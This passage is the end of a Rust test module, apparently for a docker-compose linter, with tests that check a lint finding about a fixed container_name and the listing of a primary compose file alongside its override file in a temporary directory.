        let findings = lint_json(json);
        assert_eq!(findings.len(), 1, "null values skipped, real finding kept: {findings:?}");
        assert!(findings[0].contains("container_name: fixed"));
    }

    #[test]
    fn base_files_lists_primary_and_sibling_override() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("docker-compose.yml"), "services: {}\n").unwrap();
        std::fs::write(dir.path().join("docker-compose.override.yml"), "services: {}\n").unwrap();
        let files = base_files(dir.path());
        assert_eq!(files.len(), 2);
        assert!(files[0].ends_with("docker-compose.yml"));
        assert!(files[1].ends_with("docker-compose.override.yml"));
        assert!(base_files(tempfile::tempdir().unwrap().path()).is_empty());
    }
}
